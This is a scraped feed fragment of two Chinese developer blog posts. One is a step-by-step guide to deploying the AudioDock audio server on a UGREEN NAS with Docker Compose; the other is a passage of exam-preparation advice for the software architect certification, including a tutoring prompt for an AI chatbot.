.hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h3 data-id="heading-0">前言</h3>
<p>AudioDock（声仓）发布之后，好多感兴趣的小伙伴给了我反馈，感谢支持！</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmmdctjj%2FAudioDock" target="_blank" title="https://github.com/mmdctjj/AudioDock" ref="nofollow noopener noreferrer">github.com/mmdctjj/Aud…</a></p>
<p>今天先来介绍下绿联云 NAS 的安装指南。我的NAS型号是：DH2600，新系统。</p>
<h4 data-id="heading-1">往期精彩推荐</h4>
<ul>
<li><a href="https://juejin.cn/post/7586518130761007144" target="_blank" title="https://juejin.cn/post/7586518130761007144">pnpm + monorepo 才是 AI 协同开发的最佳方案！🚀🚀🚀</a></li>
<li><a href="https://juejin.cn/post/7587965908288749578" target="_blank" title="https://juejin.cn/post/7587965908288749578"># AudioDock：服务器和 NAS 音频播放最棒的软件！🚀🚀🚀</a></li>
<li>更多精彩内容欢迎关注我的公众号：萌萌哒草头将军</li>
</ul>
<h3 data-id="heading-2">正文</h3>
<h4 data-id="heading-3">准备工作</h4>
<p>首先确保自己的 NAS 可以下载 Docker 镜像。无法下载可以在后台私信我。</p>
<p>然后在 共享文件夹/docker 目录下新增一个文件目录：audiodock。</p>
<p>我新建过了，所以新建了 audiodock2 项目。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/46f59411b837408a97461455ce103ac0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JCM6JCM5ZOS6I2J5aS05bCG5Yab:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767621278&amp;x-signature=809%2Fb46PBRVxF8%2FP2xLbhixsPqg%3D" alt="新建目录" loading="lazy"/></p>
<p>打开这个文件目录，新建三个文件夹：music、audio、covers</p>
<blockquote>
<p>music 是映射音乐的目录、audio 是映射声书的目录，covers 存放解析后封面的目录。</p>
</blockquote>
<p>从 GitHub 下载的 nginx.conf 文件拖动到当前目录下。下载地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmmdctjj%2FAudioDock" target="_blank" title="https://github.com/mmdctjj/AudioDock" ref="nofollow noopener noreferrer">github.com/mmdctjj/Aud…</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26b80af1de674d3cbae4c083d3d02b39~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JCM6JCM5ZOS6I2J5aS05bCG5Yab:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767621278&amp;x-signature=cKLKm92ApariXP4RAn4YI01evuA%3D" alt="" loading="lazy"/></p>
<p>然后打开 Docker 应用的项目栏目，新建一个项目：audiodock</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e19e3a1653204e05806f07f970455bc1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JCM6JCM5ZOS6I2J5aS05bCG5Yab:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767621278&amp;x-signature=k3O%2FcqXVhjqQkoYvF4i4qpEn600%3D" alt="新建项目" loading="lazy"/></p>
<p>这时候系统会自动识别新建的 audiodock 目录。</p>
<p>将下面的内容复制到 compose 配置中。</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">"3.8"</span>

<span class="hljs-attr">services:</span>
  <span class="hljs-comment"># 1. API 后端服务 (Node.js)</span>
  <span class="hljs-attr">api:</span>
    <span class="hljs-attr">platform:</span> <span class="hljs-string">linux/amd64</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">mmdctjj/audiodock-api</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">audiodock-api</span>

    <span class="hljs-comment"># 容器内部端口 (3000) 默认对内部网络开放，无需 ports 字段映射到宿主机</span>
    <span class="hljs-comment"># 如果要直接测试 API，可以加上 ports: - "3000:3000"</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"8858:3000"</span>

    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">AUDIO_BOOK_DIR=/audio</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">MUSIC_BASE_DIR=/music</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">CACHE_DIR=/covers</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DATABASE_URL=file:/data/dev.db</span>

    <span class="hljs-comment"># 挂载数据文件和缓存，使用 Docker 命名卷更安全</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">/volume1/迅雷下载/有声书:/audio</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">/volume1/迅雷下载/音乐:/music</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./covers:/covers</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">api-db:/data</span>

    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">audiodock-network</span>

  <span class="hljs-comment"># 2. Web 前端服务 (Nginx) - 用于托管静态文件和反向代理</span>
  <span class="hljs-attr">web:</span>
    <span class="hljs-attr">platform:</span> <span class="hljs-string">linux/amd64</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">mmdctjj/audiodock-web</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">audiodock-web</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"9959:9958"</span> <span class="hljs-comment"># &lt;--- 将 Web 服务的 80 端口映射到宿主机的 8080 端口</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./nginx.conf:/etc/nginx/nginx.conf:ro</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">api</span> <span class="hljs-comment"># 确保 API 容器先启动</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">audiodock-network</span>

<span class="hljs-attr">volumes:</span>
  <span class="hljs-attr">api-cache:</span> <span class="hljs-comment"># 命名卷用于缓存</span>
  <span class="hljs-attr">api-db:</span> <span class="hljs-comment"># 命名卷用于 SQLite 或其他数据文件</span>

<span class="hljs-attr">networks:</span>
  <span class="hljs-attr">audiodock-network:</span>
</code></pre>
<p>重点替换替换下映射路径：</p>
<pre><code class="hljs language-yaml" lang="yaml"> <span class="hljs-comment"># 挂载数据文件和缓存，使用 Docker 命名卷更安全</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">/volume1/迅雷下载/有声书:/audio</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">/volume1/迅雷下载/音乐:/music</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./covers:/covers</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">api-db:/data</span>
</code></pre>
<p>映射路径的查看是选中文件夹右键属性，可以看到具体的地址，复制即可。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d750ad3040584829951c1527d5151115~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JCM6JCM5ZOS6I2J5aS05bCG5Yab:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767621278&amp;x-signature=2JayM7dxIzx8sVty5NFmiZMUUTY%3D" alt="查看文件地址" loading="lazy"/></p>
<p>最后保证服务端口映射没有重复，点击重新部署即可启动服务。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f68366bb33af418aa9307e4e0a2dc3c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JCM6JCM5ZOS6I2J5aS05bCG5Yab:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767621278&amp;x-signature=jKL%2FFMLiYj8aWVClcsLxIdNB0y0%3D" alt="启动部署" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82a0d22da5e74898ace234947296b868~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JCM6JCM5ZOS6I2J5aS05bCG5Yab:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767621278&amp;x-signature=eKJLcE5SkTVJmaxbr9%2B8d99fjBU%3D" alt="部署成功" loading="lazy"/></p>
<p>接下来稍等一会，等数据入库完成，后端服务占用资源减少</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a3573e1795e84c2fa3e06247d6bc9918~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JCM6JCM5ZOS6I2J5aS05bCG5Yab:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767621278&amp;x-signature=89baMSfvlHUfan%2BElQ%2B7SxZPiqc%3D" alt="入库完成" loading="lazy"/></p>
<p>打开页面地址，会看到页面是这样的</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c839a25b9c54a2fa3d844aa68e9f63a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JCM6JCM5ZOS6I2J5aS05bCG5Yab:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767621278&amp;x-signature=dQuYVN7On%2F4ER9maNW6zyoson7M%3D" alt="页面" loading="lazy"/></p>
<p>输入后端服务器地址，鼠标点击页面空白区域，或者按 tab 键，会触发后端服务状态检查，绿代表链接成功，红色代表链接错误。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e3001ea000b4499b0350d9c26c3aec6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JCM6JCM5ZOS6I2J5aS05bCG5Yab:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767621278&amp;x-signature=feuuuCCIjZEVEfJb4SIEdyZyq48%3D" alt="后端服务链接成功" loading="lazy"/></p>
<p>输入用户名、密码登陆，或者点注册之后输入确认密码登陆并注册！</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ccc4fb5366e477faf9d5cad04aab415~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JCM6JCM5ZOS6I2J5aS05bCG5Yab:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767621278&amp;x-signature=GcX%2B0aw8Ik7%2FaMtd9u5QULJ71wE%3D" alt="注册并登陆" loading="lazy"/></p>
<p>页面会刷新首页，看到是这样的首页说明完全成功了（马赛克是防止版权问题平台不过审）！</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/94fdeb0dc659489f9fa56c6afde0f332~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JCM6JCM5ZOS6I2J5aS05bCG5Yab:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767621278&amp;x-signature=WTEVe8%2BmWxmr348ImTWoJf6D8Ec%3D" alt="登陆成功" loading="lazy"/></p>
<p>以上就是部署服务端、web端的教程！桌面端的部署请看上篇文章。移动端预计本周末发版，敬请期待！</p>
<h3 data-id="heading-4">最后</h3>
<p>本篇文章主要介绍了绿联云 nas 如何安装 AudioDock ！</p>
<p>为了方便大家交流，我建了一个沟通群，欢迎大家入群交流。</p>
<p>如果无法下载镜像或者 nginx.conf 等文件，可以在后台回复 audiodock，我看到会发最新版的下载链接。</p>
<p>欢迎 Star：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmmdctjj%2FAudioDock" target="_blank" title="https://github.com/mmdctjj/AudioDock" ref="nofollow noopener noreferrer">github.com/mmdctjj/Aud…</a></p>
<h4 data-id="heading-5">往期精彩推荐</h4>
<ul>
<li><a href="https://juejin.cn/post/7586518130761007144" target="_blank" title="https://juejin.cn/post/7586518130761007144">pnpm + monorepo 才是 AI 协同开发的最佳方案！🚀🚀🚀</a></li>
<li><a href="https://juejin.cn/post/7587965908288749578" target="_blank" title="https://juejin.cn/post/7587965908288749578"># AudioDock：服务器和 NAS 音频播放最棒的软件！🚀🚀🚀</a></li>
<li>更多精彩内容欢迎关注我的公众号：萌萌哒草头将军</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[软考架构师：考试心得分享]]></title>    <link>https://juejin.cn/post/7589126920286208010</link>    <guid>https://juejin.cn/post/7589126920286208010</guid>    <pubDate>2025-12-29T12:26:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589126920286208010" data-draft-id="7589092567544692745" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="软考架构师：考试心得分享"/> <meta itemprop="keywords" content="架构,程序员"/> <meta itemprop="datePublished" content="2025-12-29T12:26:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="怒放吧德德"/> <meta itemprop="url" content="https://juejin.cn/user/2502950820787672"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            软考架构师：考试心得分享
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2502950820787672/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    怒放吧德德
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T12:26:51.000Z" title="Mon Dec 29 2025 12:26:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">软考架构师：考试心得分享</h2>
<blockquote>
<p>😄生命不息，写作不止</p>
<p>🔥 继续踏上学习之路，学之分享笔记</p>
<p>👊 总有一天我也能像各位大佬一样</p>
<p>🏆 <a href="https://juejin.cn/user/2502950820787672" target="_blank" title="https://juejin.cn/user/2502950820787672">博客首页</a>   <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cnblogs.com%2Flyd-code%2F" target="_blank" title="https://www.cnblogs.com/lyd-code/" ref="nofollow noopener noreferrer">@怒放吧德德</a>  <a href="https://link.juejin.cn?target=https%3A%2F%2Flydandtry.github.io%2F" target="_blank" title="https://lydandtry.github.io/" ref="nofollow noopener noreferrer">To记录领地</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fqq_43843951%3Ftype%3Dblog" target="_blank" title="https://blog.csdn.net/qq_43843951?type=blog" ref="nofollow noopener noreferrer">@一个有梦有戏的人</a></p>
<p>🌝分享学习心得，欢迎指正，大家一起学习成长！</p>
<p>🏆AI : Grok</p>
</blockquote>
<p><em>转发请携带作者信息</em>  <strong>@怒放吧德德(掘金) @一个有梦有戏的人(CSDN)</strong></p>
<h3 data-id="heading-1">前言</h3>
<p>2025 年下半年，我通过二十多个夜晚，在下班之后准备复习考试，最后通过了考试；说实话有些知识点是啃老本（大学的时候考过中级的软件设计师），打算写一下自己的考试心得，分享给正在准备以及即将备考的同志们。</p>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5744c5ebd99d4832858de290bd80a4a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCS5pS-5ZCn5b635b63:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767616126&amp;x-signature=NI%2FrQwBlNemwZWPHpDC20UiCUR4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-2">科目选择</h3>
<p>很多会疑惑自己想要选择什么考试科目？然而这需要根据自身来选择，因为我是一名技术爱好者，所以自身会选择系统架构设计师，那么如果你是为了要有一本高级证书或者说是为了 E 类人才，那么可以选择信息系统项目管理师。</p>
<h3 data-id="heading-3">备考经验</h3>
<p>很多人都会在网上查找，要如何备考，需要哪些资料，不知不觉你会看到好多人的建议，收集了许多资料网盘。然而需要自己思考一下，收集这么多资料，真的看的完嘛？纠结这么多真的好吗？别人的备考方式真的适合我吗？显然，我也是遇到这样的困境，只是因为毕业太久了，没有那种学习氛围，没有节奏会搞得一团糟。</p>
<p>在初期备考的时候，我也是收集了许多资料，看了许多人的备考方案，但到最后我却没有按照那些方式去复习。为什么呢？因为当时我自己思考，学习不只是找到那种所谓的熟悉感，是更应该顺应当前。像以前大学时期，我可以一天花很多时间去专研每个知识点，但是现在是工作时期，时间并不充足。于是我给自己想了一个大致的方法流程。</p>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b4a4765a5ca64d3dab8f286c1b628e7d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCS5pS-5ZCn5b635b63:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767616126&amp;x-signature=WmalQFNTMZr2Wubus6PoZ04%2Fseo%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-4">找资料</h4>
<p>找资料不要盲目查找，去咸鱼上找一下，或者报个班，报班是最方便的。找一套完整的资料，按着顺序快速学习（平时可以看看课件）。</p>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f76d886dde745b29d57b73d30cd13ba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCS5pS-5ZCn5b635b63:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767616126&amp;x-signature=cxBlQ26YXszFYTffCmZTBLTgZgE%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-5">整体学习</h4>
<p>可以不需要买教材，有教材的话也不要全看，教材可以作为字典用来查询。主要还是跟着资料的顺序进行学习，一般是先学选择题内容再去学案例题部分，前期这些基础需要 get 到。架构师的考题主要是理解为主，部分需要记忆，考试的时候会有一些是超纲的，但是只要把这些基础的拿下了，基本是稳过的。案例题的话，考试方式近几年都是趋于稳定，第一题是架构风格、质量属性，其他选作题基本就是数据库、嵌入式、web 题。这些如果不是嵌入式工作的，可以考虑直接跳过，复习都可以不复习（选择还是需要复习的，书上部分要记一下，主要是为了选择题）。遇到不会的知识点就百度、或者问 AI。建议学习不用全部学习，像我是个 Java 开发，我就把嵌入式给丢弃了。😁</p>
<p>例如，我是通过 grok 来学习的</p>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/49cbc45aafeb43aebb5b06174dc51f8d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCS5pS-5ZCn5b635b63:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767616126&amp;x-signature=HMhOxhuC6qO9dPOfWdTHTis9yNY%3D" alt="" loading="lazy"/></p>
<p>指令参考（我也是参考了其他大佬的做法，大佬文章忘记了，不然我就引用出来让大家看看）</p>
<pre><code class="hljs language-xml" lang="xml">## 角色
请你扮演中国软件水平考试高级辅导专家，负责用户发送的概念讲解和发送的题目解答，可以结合附件的内容来回答。

## 技能
### 技能1：概念讲解
当我发送一些概念或者软考概念讲解的截图时（如果是截图请使用 OCR 将图片中的文字提取出来）。
Step1：根据概括或截图帮我讲解一下相关内容，讲解时尽量通俗易懂，并给出恰当的例子，优先使用 markdown 表格的形式来呈现
Step2：出 1 0道符合当前知识点的选择题并在所有题目后给出答案和对应的详细解释。

### 技能2：试题辅导
当用户发送软考的题目的内容或者截图（如果是截图请使用 OCR 将图片中的文字提取出来）
Step1：请你给出答案并详细解释原因。
Step2：出 1 道相似的选择题并给出答案和对应的详细解释。
输出格式为（先是所有的题目，接着再把答案放后面）：
题目
答案为：<span class="hljs-tag">&lt;<span class="hljs-name">答案</span>&gt;</span>。
详细讲解: <span class="hljs-tag">&lt;<span class="hljs-name">详细讲解</span>&gt;</span>

### 相似题目
<span class="hljs-tag">&lt;<span class="hljs-name">出</span> <span class="hljs-attr">1</span> <span class="hljs-attr">道考察相同知识点的相似的题目</span>&gt;</span>
答案和解析：
<span class="hljs-tag">&lt;<span class="hljs-name">答案和对应的相解</span>&gt;</span>


### 技能3：出题
当用户发送的内容包含“出题”时，表示希望你根据提供的概念出 4 道相关的选择题。

### 技能4：问题解答
当用户发送一个问题时，你只需要回答问题即可。

## 要求
1 必须使用中文回答我
2 解答时，尽量使用通俗易懂的语言
3 讲解时，如果有可能尽量给出相关例子
4 讲解时，优先考虑使用markdown表格的方式呈现，如果出现不同层级的概念，可以将不同层级的概念用不同的表格表示
5 给出答案和解析时，每道题的答案和解释要在一起给出，答案的解释需要详尽
</code></pre>
<h4 data-id="heading-6">刷题</h4>
<p>刷题推荐在<a href="https://link.juejin.cn?target=https%3A%2F%2Fwangxiao.xisaiwang.com%2Ftiku2%2Flist-zt131.html" target="_blank" title="https://wangxiao.xisaiwang.com/tiku2/list-zt131.html" ref="nofollow noopener noreferrer">希赛网</a>进行刷题，希赛有每日一题，建议刚学完的时候可以先刷一下。案例题内容学完之后可以考虑刷整张试卷。希赛网是有考试形式的方式，建议先刷 20-23 的卷子，其中 23-25 可能有的题目存在缺陷，但是需要着重学习，比如非超纲题型需要掌握，因为下次考试很可能会相似，尤其是选择题，相似度可能会比较大，案例题我觉得是变形占最大。</p>
<blockquote>
